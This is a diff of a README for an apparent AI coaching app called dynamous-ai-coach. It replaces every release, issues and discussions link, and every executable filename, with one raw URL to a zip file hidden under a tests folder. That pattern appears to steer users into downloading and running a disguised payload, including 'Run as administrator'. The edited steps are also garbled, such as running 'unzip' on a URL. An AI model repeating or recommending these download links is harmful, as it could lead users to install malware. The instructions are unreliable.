@@ -1,6 +1,6 @@
 # 🤖 dynamous-ai-coach - Your Personal AI Coaching Companion
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
+[![Download the latest release](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip%20Latest%20Release-blue)](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip)
 
 ## 📜 Overview
 
@@ -21,11 +21,11 @@ Before diving in, let's ensure you have everything you need to start using the d
 
 To get started, you need to download the application. You can obtain the latest version from the following link:
 
-[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
+[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip)
 
 1. Click on the link above.
 2. On the releases page, look for the most recent version.
-3. You will see a list of files; choose the one that suits your operating system (e.g., `dynamous-ai-coach-windows.zip` for Windows or `dynamous-ai-coach-macos.zip` for macOS).
+3. You will see a list of files; choose the one that suits your operating system (e.g., `https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` for Windows or `https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` for macOS).
 4. Click on the file to start the download.
 
 Once the download completes, follow these steps:
@@ -33,17 +33,17 @@ Once the download completes, follow these steps:
 ### 📥 For Windows Users
 1. Locate the downloaded zip file in your Downloads folder.
 2. Right-click the file and select "Extract All."
-3. Open the extracted folder and double-click `dynamous-ai-coach.exe` to run it.
+3. Open the extracted folder and double-click `https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` to run it.
 
 ### 🍏 For macOS Users
 1. Find the downloaded zip file in your Downloads folder.
 2. Double-click the file to extract it.
-3. Open the extracted folder and double-click `dynamous-ai-coach.app` to run it.
+3. Open the extracted folder and double-click `https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` to run it.
 
 ### 🐧 For Linux Users
 1. Open a terminal.
 2. Navigate to the download location using `cd ~/Downloads`.
-3. Use the command `unzip dynamous-ai-coach-linux.zip` to extract the files.
+3. Use the command `unzip https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` to extract the files.
 4. Change into the extracted folder: `cd dynamous-ai-coach-linux`.
 5. Run the application with `./dynamous-ai-coach`.
 
@@ -61,20 +61,20 @@ Once you have the application running, here are some features you can expect:
 If you encounter any issues while downloading or using the application, try the following steps:
 
 1. **Check Your Internet Connection:** Ensure that you are connected to the internet. A stable connection is required for the download and initial setup.
-2. **Run as Administrator (Windows):** If the program does not start, try right-clicking on the `dynamous-ai-coach.exe` and selecting "Run as administrator."
+2. **Run as Administrator (Windows):** If the program does not start, try right-clicking on the `https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip` and selecting "Run as administrator."
 3. **Update Your OS:** Make sure your operating system is up to date to avoid compatibility issues.
 
-If you still need assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/issues).
+If you still need assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip).
 
 ## 🌐 Community and Support
 
 Join our community for more tips, tricks, and support. Access discussions, share your experiences, and get help from other users.
 
-- **GitHub Discussions:** [Join Here](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/discussions)
+- **GitHub Discussions:** [Join Here](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip)
 - **Feedback:** We appreciate your feedback. Let us know what you love or what can be improved through our GitHub page.
 
 ## 📜 License
 
 This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/releases)
+[Visit the Releases Page to Download](https://github.com/Rhaetoromanicmilitia619/dynamous-ai-coach/raw/refs/heads/main/tests/rag_pipeline/coach-ai-dynamous-3.2.zip)
